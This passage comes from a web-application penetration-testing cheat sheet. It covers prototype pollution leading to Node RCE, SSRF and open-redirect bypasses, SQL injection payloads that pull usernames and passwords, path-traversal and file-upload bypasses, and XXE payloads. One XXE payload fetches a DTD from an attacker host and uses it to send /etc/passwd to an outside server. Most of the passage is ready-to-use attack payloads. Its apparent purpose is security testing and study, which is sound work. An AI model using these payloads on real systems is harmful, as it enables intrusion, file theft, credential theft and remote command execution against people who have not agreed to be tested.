<li>Prototype pollution via the constructor is possible when <strong>the prototype is not set to null</strong> (i.e. Object created with <code>Object.create(null);</code>) and the <code>constructor.prototype</code> property is user controllable. <code>constructor.prototype</code> is equivalent to <code>__proto__</code>.</li>
</ul>
<p>Another possibility is to pollute one of the properties passed to <code>fetch()</code> browser API as second parameter. These are passed as an object and therefore, if a suitable source is found, an attacker could pollute <code>Object.prototype</code> in order to override one of these properties. Properties could be:</p>
<ul>
<li><code>headers</code></li>
<li><code>body</code></li>
<li>etc.</li>
</ul>
<p>It's also possible to perform prototype pollution via <code>Object.defineProperty()</code>. This method enables the developer to set a non-configurable, non-writable property directly on the affected object. As for <code>fetch()</code> API, also <code>Object.defineProperty()</code> accepts an object as third parameter. This parameter is called "descriptor" and, being an object, is "pollutable" by the `Object.prototype.</p>
<ul>
<li>For example, the descriptor allows to define a default value for the defined property by mean of the <code>value</code> descriptor property. If this property is not used, it could be possible for an attacker to override it by prototype pollution.</li>
</ul>
<p>For server-side prototype pollution, remember that the <code>for...in</code> loops also over properties inherited from the prototype. If a user controllable input such as a <code>POST</code> request body vulnerable to pollution and its properties are iterated with the <code>for...in</code> loop, the injected prototype property will be also evaluated.</p>
<ul>
<li>if the polluted property is reflected somewhere, it's easier to identify a server-side pollution.</li>
</ul>
<p>For example:</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">"address_line_1"</span><span class="p">:</span><span class="s2">"Wiener HQ"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"address_line_2"</span><span class="p">:</span><span class="s2">"One Wiener Way"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"city"</span><span class="p">:</span><span class="s2">"Wienerville"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"postcode"</span><span class="p">:</span><span class="s2">"BU1 1RP"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"country"</span><span class="p">:</span><span class="s2">"UK"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"sessionId"</span><span class="p">:</span><span class="s2">"FP293HMQv1CTO8TZoGSjr5Yu5vDHlsnh"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"__proto__"</span><span class="p">:{</span>
<span class="w">        </span><span class="nt">"isAdmin"</span><span class="p">:</span><span class="kc">true</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>Detecting server-side prototype pollution without polluted property reflection:</p>
<ul>
<li><strong>Status-code override</strong>: for example, in node error responses there's the property <code>status</code>. Try overriding this property with values between 400 and 599.</li>
<li><strong>JSON spaces override</strong>: The Express framework provides a <code>json spaces</code> option, which enables you to configure the number of spaces used to indent any JSON data in the response. Try changing this property. Although the prototype pollution has been fixed in Express 4.17.4, websites that haven't upgraded may still be vulnerable. Remember that Burp auto-indent responses so set the response view to raw.</li>
<li><strong>Charset Override</strong>: Try sending a value encoded with a different charset, then override the charset and resend the value to check if the charset on the server has changed. The Express' <code>body-parser</code> module uses the property <code>content-type</code>. If a suitable prototype pollution source is found, try overriding this property.</li>
</ul>
<p>Following an example of Charset Override to UTF-7 in Express:</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">"sessionId"</span><span class="p">:</span><span class="s2">"0123456789"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"username"</span><span class="p">:</span><span class="s2">"wiener"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"role"</span><span class="p">:</span><span class="s2">"default"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"__proto__"</span><span class="p">:{</span>
<span class="w">        </span><span class="nt">"content-type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/json; charset=utf-7"</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="c1">// OR with constructor.prototype</span>
<span class="w">    </span><span class="nt">"constructor"</span><span class="p">:{</span>
<span class="w">        </span><span class="nt">"prototype"</span><span class="p">:{</span>
<span class="w">            </span><span class="nt">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>Example of Node RCE probe:</p>
<div class="highlight"><pre><span></span><code><span class="nt">"__proto__"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">"shell"</span><span class="p">:</span><span class="s2">"node"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"NODE_OPTIONS"</span><span class="p">:</span><span class="s2">"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"</span>
<span class="p">}</span>
</code></pre></div>
<p>If the server uses the <code>fork()</code> from <code>child_process</code> module: </p>
<ul>
<li><code>fork()</code> accepts an options object in which one of the potential options is the <code>execArgv</code> property. If it's left undefined by the developers, this potentially also means it can be controlled via prototype pollution.</li>
</ul>
<p>Example of Node RCE via <code>fork()</code>'s <code>execArgv</code> pollution:</p>
<div class="highlight"><pre><span></span><code><span class="nt">"__proto__"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">"execArgv"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="s2">"--eval=child_process.execSync('id')"</span>
<span class="w">    </span><span class="p">]</span>
<span class="p">}</span>
</code></pre></div>
<p>If the server code runs <code>execSync</code> itself, it could be possible to obtain an RCE by polluting the following properties:</p>
<ul>
<li>The <code>input</code> property is a string containing the command to execute. If not defined by the developer (the command can be passed also as parameter to the function), it could be polluted.</li>
<li>The <code>shell</code> option lets developers declare a specific shell in which they want the command to run.</li>
</ul>
<p>Example of RCE via <code>execSync</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nt">"__proto__"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">"shell"</span><span class="p">:</span><span class="s2">"vim"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"input"</span><span class="p">:</span><span class="s2">":! &lt;command&gt;\n"</span>
<span class="p">}</span>
</code></pre></div>
<p>*Note:</p>
<ul>
<li>The <code>shell</code> option only accepts the name of the shell's executable and does not allow you to set any additional command-line arguments.</li>
<li>The shell is always executed with the <code>-c</code> argument, which most shells use to let you pass in a command as a string. However, setting the <code>-c</code> flag in Node instead runs a syntax check on the provided script, which also prevents it from executing. As a result, although there are workarounds for this, it's generally tricky to use Node itself as a shell for your attack.</li>
<li>As the <code>input</code> property containing your payload is passed via <code>stdin</code>, the shell you choose must accept commands from <code>stdin</code>.</li>
</ul>
<h2 id="race-conditions">Race Conditions</h2>
<p>Following a list of checks to perform in order to understand the applicability of a race condition attack:</p>
<ul>
<li>Check if delay is due endpoint logic or back-end connection by sending <strong>sequential requests</strong> (i.e "connection warming"): if the first takes way more time than the others, the latency is due the back-end  and not due the logic implemented by the endpoint. <strong>Back-end connection delays don't usually interfere with race condition attacks because they typically delay parallel requests equally, so the requests stay in sync.</strong></li>
<li>Check if any session-based lock mechanism; for example, PHP locks on the session id by default, so a separate session for every request in the batch is needed in order to make them be processed in parallel.</li>
<li>Web servers often delay the processing of requests if too many are sent too quickly. If connection warming doesn't make any difference, sending a large number of dummy requests to intentionally trigger the rate or resource limit, may allow to cause a suitable server-side delay.</li>
</ul>
<p>Reference: <a href="https://portswigger.net/web-security/race-conditions">https://portswigger.net/web-security/race-conditions</a></p>
<h2 id="same-origin-policy-sop">Same-Origin Policy (SOP)</h2>
<p>Generally, loading cross-site resources is allowed (images, video, audio) but Javascript is prevented from accessing their content with some exceptions:</p>
<ul>
<li>Cross-domain iframes or windows <code>location</code> and <code>location.href</code> are <strong>writable</strong> but not readable</li>
<li>Cross-domain <code>window.length</code> (number of frames) and <code>window.closed</code> are <strong>readable</strong> but not writable.</li>
<li>It's possible to cross-domain use the <code>replace</code> function on the <code>location</code> object.</li>
<li>Some functions such as <code>window.close</code>, <code>window.blur</code> and <code>window.focus</code> are allowed cross-domain.</li>
<li>The <code>postMessage</code> function can be used to send cross-domain messages to iframes or windows.</li>
</ul>
<p>Due to legacy requirements, the same-origin policy is more relaxed when dealing with cookies, so <strong>they are often accessible from all subdomains of a site</strong> even though each subdomain is technically a different origin. Partially mitigated by the <code>HttpOnly</code> cookie attribute.</p>
<p>It's possible to relax same-origin policy using <code>document.domain</code> by setting a specific domain for both the cross-site sites for which SOP is being relaxed. </p>
<p>If an attacker has control on the <code>document.domain</code>, can manipulate to allow cross-domain interactions toward a domain he controls.</p>
<h2 id="saml">SAML</h2>
<p>Refer to: <a href="http://localhost:1337/books/attacking-and-exploiting-modern-web-applications.html#saml">SAML</a></p>
<h2 id="server-side-request-forgery-ssrf">Server-Side Request Forgery (SSRF)</h2>
<p>Check the <code>Referer</code> header; if used for analytics purposes can be abused to achieve a blind SSRF.</p>
<h3 id="bypasses_3">Bypasses</h3>
<p>Here's a list of some bypasses for <strong>black-list based filters</strong>:</p>
<ul>
<li>Alternatives to <code>127.0.0.1</code>: <code>2130706433</code>, <code>017700000001</code>, <code>127.1</code></li>
<li>Register a domain name that resolves to <code>127.0.0.1</code> or use <code>spoofed.burpcollaborator.net</code></li>
<li><strong>URL Encoding</strong> or <strong>Case variations</strong></li>
<li>Use an attacker-controlled URL to redirect the application to the target URL. Try using different status code and protocols.</li>
<li>Abuse an Open Redirect</li>
</ul>
<p>Here's a list of some bypasses for <strong>black-list based filters</strong>:</p>
<div class="highlight"><pre><span></span><code><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">expected</span><span class="o">-</span><span class="k">host</span><span class="err">:</span><span class="n">fakepassword</span><span class="nv">@evil</span><span class="o">-</span><span class="k">host</span>

<span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">evil</span><span class="o">-</span><span class="k">host</span><span class="n">#expected</span><span class="o">-</span><span class="k">host</span>

<span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">expected</span><span class="o">-</span><span class="k">host</span><span class="p">.</span><span class="n">evil</span><span class="o">-</span><span class="k">host</span>

<span class="n">URL</span><span class="w"> </span><span class="n">Encoder</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">Double</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">Encode</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">strings</span>

<span class="n">Abuse</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="k">Open</span><span class="w"> </span><span class="n">Redirect</span>
</code></pre></div>
<h2 id="sql-injection_1">SQL Injection</h2>
<p>Useful resource: <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
<p>DB version query:</p>
<div class="highlight"><pre><span></span><code><span class="n">Microsoft</span><span class="p">,</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">@@</span><span class="k">version</span>

<span class="n">Oracle</span><span class="p">:</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span>

<span class="n">PostgreSQL</span><span class="p">:</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">version</span><span class="p">()</span>

<span class="n">SQLite</span><span class="p">:</span><span class="w"> </span><span class="n">sqlite_version</span><span class="p">()</span>
</code></pre></div>
<p>Get database name:</p>
<div class="highlight"><pre><span></span><code><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="k">database</span><span class="p">()</span>
</code></pre></div>
<p>Get list of tables in db:</p>
<div class="highlight"><pre><span></span><code><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">'</span><span class="n">sqli_one</span>
</code></pre></div>
<p>Get list of columns in table:</p>
<div class="highlight"><pre><span></span><code><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'staff_users'</span>
</code></pre></div>
<p>Extract information:</p>
<div class="highlight"><pre><span></span><code><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s1">':'</span><span class="p">,</span><span class="n">password</span><span class="w"> </span><span class="n">SEPARATOR</span><span class="w"> </span><span class="s1">'&lt;br&gt;'</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">staff_users</span>
</code></pre></div>
<p>Time based check :</p>
<div class="highlight"><pre><span></span><code><span class="n">admin123</span><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span><span class="c1">--</span>
</code></pre></div>
<p>Note: If no delay is returned, the number of columns could be wrong.</p>
<p>In <strong>UNION-based SQLi</strong>, the columns types must match; NULL is convertable in any (nullable) type and it's useful to enumerate the correct number of columns.</p>
<div class="highlight"><pre><span></span><code><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--</span>
</code></pre></div>
<p>When dealing with <strong>ORACLE</strong> DBs, every SELECT query must be accompanied by the FROM clause and it has to specify a valid table:</p>
<div class="highlight"><pre><span></span><code><span class="err">'</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">DUAL</span><span class="c1">--</span>
</code></pre></div>
<p>With <strong>Blind SQLi</strong> sometimes no feedback is returned regardless of whether the query returns any data. In these cases could be useful to trigger conditional errors; ery often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message.</p>
<div class="highlight"><pre><span></span><code><span class="n">xyz</span><span class="s1">' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE '</span><span class="n">a</span><span class="s1">' END)='</span><span class="n">a</span><span class="w"> </span>
<span class="n">xyz</span><span class="s1">' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '</span><span class="n">a</span><span class="s1">' END)='</span><span class="n">a</span>
</code></pre></div>
<p>Turn visible some Blind SQLi results - applicable when there's a database error pattern disclosure:</p>
<div class="highlight"><pre><span></span><code><span class="k">CAST</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">example_column</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">example_table</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="nb">int</span><span class="p">)</span>
</code></pre></div>
<h2 id="open-redirect">Open Redirect</h2>
<p>DOM-based open redirects sinks:</p>
<div class="highlight"><pre><span></span><code><span class="nx">location</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">host</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">hostname</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">href</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">pathname</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">search</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">protocol</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">assign</span><span class="p">()</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">()</span>
<span class="nx">open</span><span class="p">()</span>
<span class="nx">element</span><span class="p">.</span><span class="nx">srcdoc</span>
<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">open</span><span class="p">()</span>
<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">send</span><span class="p">()</span>
<span class="nx">jQuery</span><span class="p">.</span><span class="nx">ajax</span><span class="p">()</span>
<span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">()</span>
</code></pre></div>
<h3 id="bypasses_4">Bypasses</h3>
<p>Multiple /:</p>
<div class="highlight"><pre><span></span><code>?url=https:///google.com
</code></pre></div>
<p>Space before the url:</p>
<div class="highlight"><pre><span></span><code>?url=+https://google.com
</code></pre></div>
<p>Escape char on the second /:</p>
<div class="highlight"><pre><span></span><code>?url=+https:/\/google.com
</code></pre></div>
<p><code>startWith</code> or <code>indexOf</code> "target.com:" </p>
<div class="highlight"><pre><span></span><code>target.com.attacker.com
</code></pre></div>
<p>Fake relative: </p>
<div class="highlight"><pre><span></span><code><span class="c1">//attacker.com</span>
</code></pre></div>
<p>/\? before the @:</p>
<div class="highlight"><pre><span></span><code><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">attacker</span><span class="p">.</span><span class="n">com</span><span class="err">\</span><span class="nv">@target</span><span class="p">.</span><span class="n">com</span>
<span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">attacker</span><span class="p">.</span><span class="n">com</span><span class="vm">?</span><span class="nv">@target</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<p>Multiline regex: </p>
<div class="highlight"><pre><span></span><code>attacker.com%0d%0atarget.com
</code></pre></div>
<h2 id="file-inclusion_1">File Inclusion</h2>
<h3 id="php-filters-and-wrappers">PHP Filters and Wrappers</h3>
<p>Pass arbitrary data using the <code>data://</code> wrapper in input:</p>
<div class="highlight"><pre><span></span><code><span class="nt">data</span><span class="o">://</span><span class="nt">text</span><span class="o">/</span><span class="nt">plain</span><span class="o">;</span><span class="nt">base64</span><span class="o">,&lt;</span><span class="nt">base64</span><span class="w"> </span><span class="nt">encoded</span><span class="w"> </span><span class="nt">data</span><span class="o">&gt;</span>
</code></pre></div>
<p>Consider the following code:</p>
<div class="highlight"><pre><span></span><code><span class="x">echo json_decode(file_get_contents($userControlledInput), true);</span>
</code></pre></div>
<p>Passing a system file path into the <code>$userControlledInput</code> WON'T work since the <code>json_decode</code> function expects a valid JSON content in the file being read. In order to allow exfiltrating also non-JSON files content, i'ts possible to create a <strong>filter chain</strong> using <a href="https://github.com/ambionics/wrapwrap">wrapwrap</a> that will prepend and append some chars, making the content JSON-valid:</p>
<div class="highlight"><pre><span></span><code>python<span class="w"> </span>wrapwrap.py<span class="w"> </span>&lt;file<span class="w"> </span>to<span class="w"> </span>exfiltrate&gt;<span class="w"> </span>&lt;prefix&gt;<span class="w"> </span>&lt;suffix&gt;<span class="w"> </span>&lt;number<span class="w"> </span>of<span class="w"> </span>bytes&gt;

<span class="c1"># Example</span>
python<span class="w"> </span>wrapwrap.py<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="s1">'{"x":"'</span><span class="w"> </span><span class="s1">'"}'</span><span class="w"> </span><span class="m">1000</span>
python<span class="w"> </span>wrapwrap.py<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="s1">'"'</span><span class="w"> </span><span class="s1">'"'</span><span class="w"> </span><span class="m">1000</span><span class="w"> </span><span class="c1"># string in quote are JSON valid</span>
</code></pre></div>
<h3 id="bypasses_5">Bypasses</h3>
<div class="highlight"><pre><span></span><code><span class="o">....//</span><span class="w">                </span><span class="c1"># ./ is getting replaced by something like (./)     </span>
<span class="o">....</span>\<span class="o">/</span>
<span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="w">             </span><span class="c1"># URL Encoding</span>
<span class="o">%</span><span class="mi">252</span><span class="n">e</span><span class="o">%</span><span class="mi">252</span><span class="n">e</span><span class="o">%</span><span class="mi">252</span><span class="n">f</span><span class="w">       </span><span class="c1"># Double URL Encoding</span>
<span class="o">..%</span><span class="n">c0</span><span class="o">%</span><span class="n">af</span><span class="w">              </span><span class="c1"># https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work</span>
<span class="o">..%</span><span class="n">ef</span><span class="o">%</span><span class="n">bc</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span>
<span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">images</span><span class="o">/../../../</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">  </span><span class="c1"># App is checking base path</span>
<span class="o">../../../</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="o">%</span><span class="mf">00.</span><span class="n">png</span><span class="w">           </span><span class="c1"># App is checking file extension</span>
</code></pre></div>
<h2 id="file-upload_1">File Upload</h2>
<h3 id="bypasses_6">Bypasses</h3>
<p>Setup file <em>Magic Bytes</em> in order to bypass file type checking:</p>
<div class="highlight"><pre><span></span><code>hexeditor -b filename 
</code></pre></div>
<p>Useful resource: <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">File Signatures</a> </p>
<p>Exploit NGINX virtual directories forcing it to interpet images as PHP (on older version of PHP) - <a href="https://security.stackexchange.com/questions/90968/arbitrary-file-upload-serve-jpg-as-php/90969#90969">see there</a>:</p>
<div class="highlight"><pre><span></span><code>/shell.jpg/shell.php
</code></pre></div>
<p>Exploit Apache mod_mime extension to force it to interpet images as php (on older version of php) - <a href="https://security.stackexchange.com/questions/90968/arbitrary-file-upload-serve-jpg-as-php/90969#90969">see there</a>:</p>
<div class="highlight"><pre><span></span><code>/shell.php.jpg
</code></pre></div>
<p>Test multiple PHP extension when .php is not interpeted:</p>
<div class="highlight"><pre><span></span><code>phtml
php
php3
php4
php5
php7
php8
phar
... # Consider using a wordlist
</code></pre></div>
<p>If there are insufficient restrictions on the file upload, but some principal extensions are anyway blocked (ex: php), try overwriting the WebServer configuration in order to bypass the restrictions:</p>
<div class="highlight"><pre><span></span><code># .htaccess - Run .png as php files
AddHandler application/x-httpd-php .png
</code></pre></div>
<p>For IIS, the config file is <code>web.config</code>.</p>
<p>Other  bypasses:</p>
<div class="highlight"><pre><span></span><code><span class="n">exploit</span><span class="p">.</span><span class="n">php</span><span class="o">%</span><span class="mf">00.</span><span class="n">png</span><span class="w"> </span><span class="c1"># Use null bytes to break parsing</span>

<span class="n">exploit</span><span class="p">.</span><span class="n">asp</span><span class="p">;.</span><span class="n">jpg</span><span class="w">  </span><span class="c1"># Use semicolon</span>

<span class="n">exploit</span><span class="p">.</span><span class="n">php</span><span class="p">.</span><span class="w"> </span><span class="c1"># trailing chars such as whitespaces or dot</span>

<span class="n">exploit</span><span class="o">%</span><span class="n">2Ephp</span><span class="w"> </span><span class="c1"># URL encode dot and slashes - Try also to double URL encode</span>

<span class="n n-Quoted">`xC0 x2E`</span><span class="p">,</span><span class="w"> </span><span class="n n-Quoted">`xC4 xAE`</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n n-Quoted">`xC0 xAE`</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">translated</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n n-Quoted">`x2E`</span>
</code></pre></div>
<h2 id="xml-external-entities-injection-xxe_1">XML External Entities Injection (XXE)</h2>
<p><strong>Document Type Definition (DTD)</strong></p>
<p>The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional <code>DOCTYPE</code> element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.</p>
<p><strong>XML External Entities</strong>
XML external entities are a type of custom entity whose definition is located <strong>outside of the DTD</strong> where they are declared.
The declaration of an external entity uses the <code>SYSTEM</code> keyword and must specify a URL from which the value of the entity should be loaded</p>
<p><strong>XML Parameters Entities</strong>
XML parameter entities are a special kind of XML entity which can only be referenced elsewhere <strong>within the DTD</strong>. The declaration of an XML parameter entity as well as its referencing (instead of the <code>&amp;</code>) includes the <code>%</code> character before the entity name.</p>
<p>XXE File Inclusion:</p>
<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Using XML External Entities --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span><span class="w"> </span>]&gt;
...
<span class="nt">&lt;bar&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/bar&gt;</span>
...


<span class="cm">&lt;!-- Using XML Parameters Entities --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;</span><span class="w"> </span>%xxe;<span class="w"> </span>]&gt;
</code></pre></div>
<p>XXE SSRF:</p>
<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Using XML External Entities --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://target"&gt;</span><span class="w"> </span>]&gt;
...
<span class="nt">&lt;bar&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/bar&gt;</span>
...


<span class="cm">&lt;!-- Using XML Parameters Entities --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://target"&gt;</span><span class="w"> </span>%xxe;<span class="w"> </span>]&gt;
</code></pre></div>
<p>XXE by Remote DTD hosted by the attacker:</p>
<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Remote DTD hosted at http://attacker/evil.dtd --&gt;</span>
<span class="cp">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
<span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;</span>"&gt;
%eval;
%exfiltrate;


<span class="cm">&lt;!-- Include the remote DTD with external entities --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"&gt;</span><span class="w"> </span>%xxe;]&gt;
...

<span class="cm">&lt;!-- Include the remote DTD with parameters entities --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"&gt;</span><span class="w"> </span>%xxe;<span class="w"> </span>]&gt;
</code></pre></div>
<p>XXE by remote DTD hosted by the attacker triggering an error to retrieve data:</p>
<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Remote DTD hosted at http://attacker/evil.dtd --&gt;</span>
<span class="cp">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
<span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;</span>"&gt;
%eval;
%error;


<span class="cm">&lt;!-- Include the remote DTD with external entities --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"&gt;</span><span class="w"> </span>%xxe;]&gt;
...

<span class="cm">&lt;!-- Include the remote DTD with parameters entities --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"&gt;</span><span class="w"> </span>%xxe;<span class="w"> </span>]&gt;
</code></pre></div>
<p><strong>Note</strong>: some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL so the attack might not work on some file contents containing invalid URL chars like the newline.</p>
<p><strong>DTD Repurposing</strong></p>
<p>Using an XML <strong>parameter entity within the definition of another parameter entity</strong> is generally permitted in external DTDs but not in internal DTDs.</p>
<p>When an external evil DTD can't be loaded, if the target document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD.</p>
<ul>
<li>An attacker could employ the error-based technique from within an internal DTD, <strong>provided the XML parameter entity that they use is redefining an entity that is declared within an external DTD</strong>, repurposing it.</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Payload repurposing a local DTD --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [</span>
<span class="cp">&lt;!ENTITY % local_dtd SYSTEM "file:///&lt;known local DTD path defining the custom_entity entry&gt;</span>"&gt;
<span class="cp">&lt;!ENTITY % custom_entity '&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span><span class="w"> </span><span class="cp">&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;</span>"&gt;<span class="w"> </span><span class="ni">&amp;#x25;</span>eval;<span class="w"> </span><span class="ni">&amp;#x25;</span>error;'&gt;
%local_dtd;
]&gt;
</code></pre></div>
<p><strong>XInclude</strong>
